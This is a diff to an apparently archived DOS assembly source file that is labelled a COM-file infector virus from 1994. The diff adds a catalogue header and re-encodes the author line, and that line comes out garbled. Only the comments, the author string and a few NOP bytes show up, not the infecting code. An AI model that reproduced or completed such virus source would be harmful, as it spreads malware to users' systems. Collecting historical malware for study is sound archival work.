@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      D
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 ; Com-infector ...
 
         IDEAL                                           ; Informatie voor de
@@ -129,7 +140,7 @@ DB "Misbruik hiervan is strafbaar onder de Nederlandse wet!! "
 
 Auteur:
 
-DB "(C) 1994 - [DàRkRàY] retired virus writer..."
+DB "(C) 1994 - [Dï¿½RkRï¿½Y] retired virus writer..."
 
 OLD_BYTES:      NOP
                 NOP
